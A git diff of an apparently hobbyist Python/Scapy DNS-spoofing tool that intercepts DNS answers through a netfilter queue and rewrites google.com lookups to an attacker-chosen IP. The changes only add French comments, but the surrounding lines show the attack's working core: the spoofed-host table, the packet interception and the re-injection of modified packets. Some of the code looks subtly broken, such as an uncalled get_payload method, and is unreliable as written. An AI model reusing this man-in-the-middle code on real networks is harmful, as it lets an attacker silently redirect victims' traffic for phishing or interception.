@@ -28,6 +28,7 @@ victim2_MAC = MAC_on_network[2]
 
 atk_mac = get_if_hwaddr(conf.iface) # to get mac address of hacker (device who run the code)
 
+''' Pour ajouter des noms de domaines, c'est ici '''
 false_dns_hosts = {
     b"www.google.com." : "199.16.173.108", 
     b"google.com." : "199.16.173.108",
@@ -36,9 +37,9 @@ false_dns_hosts = {
 def packet_transfer(packet):
     scapy_packet = IP(packet.get_payload) # transform packet form netfilter to scapy packet
     if scapy_packet.haslayer(DNSRR): # verif si packet est bien du DNS
-        print("[Before]:", scapy_packet.summary())
+        print("[Before]:", scapy_packet.summary()) #affiche le packet avant modification
         scapy_packet = modif_packet(scapy_packet)
-        print("[After]:", scapy_packet.summary())
+        print("[After]:", scapy_packet.summary()) #affiche le packet apres modification
         packet.set_payload(bytes(scapy_packet)) # set back as a netfilter packet and put it in the queue
     packet.accept()
 
@@ -70,3 +71,4 @@ while True:
     queue.bind(0, dns_packet)
     queue.run()
     packet_transfer(dns_packet)
+    
